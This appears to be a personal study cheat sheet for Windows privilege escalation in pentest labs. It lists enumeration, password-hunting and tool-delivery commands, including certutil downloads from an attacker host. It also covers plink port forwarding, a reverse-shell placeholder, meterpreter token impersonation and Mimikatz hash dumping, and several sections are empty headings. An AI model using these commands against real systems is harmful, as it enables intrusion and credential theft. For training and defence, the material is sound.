## Initial Enumeration
**System Enumeration**
- `systeminfo`
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
- Extract Patching: `wmic qfe` 
	- `wmic qfe get Caption,Description,HotFixID,InstalledOn`
- Logical Disk: `wmic logicaldisk`

**User Enumeration**
- View current privilege: `whoami /priv`
- Enumerate groups: `whoami /groups`
- Enumerate users on machine: `net user`
- View users details: `net user <username>`
- Enumerate group: `net localgroup`
- Enumerate specific group: `net localgrop <groupname>`

**Network Enumeration**
- `ipcofig`
- `ipconfig /all`
- If it is on AD, we can get DC which is configured as DNS server 
- `arp -a` : If there is another IP on the table, enumerate it as well. How is that IP is communicating to our machine.
- Routing table: `route print` 
- Sometimes we don't need to elevate but we need to pivot to another machine to grab the privileges.
- `netstat -ano`: See what's port are out there. It might show the ports which are not shown during the scanning.

**Password Hunting**
- `findstr /si password *.txt`
- `findstr /si password *.txt *.ini *.config *.sql`
- Find all those strings in config files.
	- `dir /s "pass" == "cred" == "vnc" == ".config"`
- Find all passwords in all files..
	- `findstr /spin "password" "."`
- More ways to find passwords in different files [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords)

**AV Enumeration**
- View windows defender: `sc query windefend`
- View what are the service (to view antivirus running): `sc queryex type=service`
- View firewall state
	- `netsh advfirewall firewall dump`
	- `netsh firewall show state`
- View firewall config
	- `firewall show config`

## Exploring Automated Tools
**Some Automated Tools**
- WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
- Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
- Sherlock - https://github.com/rasta-mouse/Sherlock
- Watson - https://github.com/rasta-mouse/Watson
- PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- JAWS - https://github.com/411Hall/JAWS
- Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
- Seatbelt - https://github.com/GhostPack/Seatbelt
- SharpUp - https://github.com/GhostPack/

**Tools Delivery**
- Create a SMB Server in you machine.
- `impacket-smbserver.py <shareName> <sharePath> -smb2support`
	- where, shareName is the name to which SMB will be connected and sharePath is the directory to which attacker is hosting, '.' to host current directory.
- In victim machine,
- Connect
	- `net use \\[host]\[shareName]`
- Copy the file to victim
	- `copy \\[host]\[shareName]\tools.exe \windows\temp\a.exe`
- Close the connection
	- `net use /d \\[host]\[shareName]`
- For more ways to transfer the files: https://medium.com/@dr.spitfire/ocsp-file-transfer-recipe-for-delicious-post-exploitation-a407e00f7346
- We can also use certutil to download the file from windows cmd.
- In attacker machine
	- `python3 -m http.server 1337`
- In victim's machine
	- `certutil -urlcache -f http://<attacker-ip>:1337/test.exe test.exe`

## Escalation Path: Kernel Exploits
**Escalation with Metasploit**
- After Metrepreter
	- `run post/multi/recon/local_exploit_suggester`

**Manual Kernel Exploitation**
- In windows PS
	- `systeminfo`
	- Copy the data from above commands.
- In attacker machine
	- Save the data in a text file
	- `windows-exploit-suggester.py --database <db-date>.xlsx --systeminfo systeminfo.txt `
- Windows Kernel Exploits - https://github.com/SecWiki/windows-kernel-exploits

## Escalation Path: Stored Passwords and Port Forwarding
 - Sometimes there are servies that are only accessible from inside the nnetwork. These services might be vulnerable since they are not meant to be seen from the outside
 - View such ports cmd: `netstat -ano`, suppose you got port 445
 - Open an SSH server on an attacker machine
- Fort port using [plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) in windows
	- `plink.exe -l <attackerusername> -pw <attackerpassword> <attackerIP> -R 445:127.0.0.1:445`
- `winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"`

## Escalation Path: Windows Subsystem for Linux
- Find out if wsl.exe and bash.exe exists on the windows machine.
	- `where /R c:\windows bash.exe`
	- `where /R c:\windows wsl.exe`
- Check if wsl.exe returns root
	- `wsl.exe whoami`
	- `wsl.exe python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'`
- HTB to practice "SecNotes"

## Impersonation and Potato Attacks
**Token Impersonation with Incognito**
- View if the user has a privilege to impersonate token
	- `whoami /priv`
- We can load incognito from meterpreter shell.
  - `load incognito`
  - `help` - It will show incognito command
  - `list_tokens -u` : List the tokens, we can impersonate the listed users.
  - `impersonate_token marvel\\administrator`
  - `shell`
  - `whoami`
- Attempt to dump hashes as Domain Admin
	- `Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer HYDRA.marvel.local`
	- `# privilege::debug`
	- `# LSADump::LSA /patch`

**Potato Attacks**
- This attack can be possible when you have `SeImpersonnate` or `SeAssignPrimaryToken` privileges. See via `whoami /priv`
- More about Rotten Potato: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
- More about Juicy Potato: https://github.com/ohpe/juicy-potato
- HTB to practice: Jeeves

## Escalation Path: getsystem

## Escalation Path: RunAs

## Escalation Path: Registry

## Escalation Path: Executable Files

## Escalation Path: Startup Applications

## Escalation Path: DLL Hijacking

## Escalation Path: Service Permissions (Paths)

## Escalation Path: CVE-2019-1388


